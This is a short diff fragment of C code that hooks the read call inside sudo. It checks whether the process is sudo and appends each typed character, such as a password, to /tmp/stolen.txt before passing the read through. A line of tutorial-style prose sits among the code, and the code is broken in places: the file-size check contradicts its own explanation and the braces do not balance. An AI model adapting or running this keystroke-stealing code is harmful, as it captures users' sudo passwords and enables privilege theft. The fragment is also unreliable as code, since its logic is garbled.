@@ -1,0 +1,14 @@
+FILE *fp_comm = fopen ("/proc/self/comm", "r");
+if(fp_comm) {
+fgets (process_name, sizeof (process_name), fp_comm);
+process_name[strcspn (process_name, "\n")] = '\0';
+if(strcmp (process_name, "sudo") == 0) {
+if(getfsize ("/tmp/stolen.txt") >= MAX_FILE_SIZE) {
+In the event that we are indeed in sudo, and our file size is low, we can then proceed to writing each character that is read from the terminal by sudo to a file in /tmp.
+FILE *stealer = fopen ("/tmp/stolen.txt", "a");
+if(count == 1) {
+fprintf (stealer, "%.1s", (char *)buf);
+}
+fclose (stealer);
+return original_read (fd, buf, count);
+
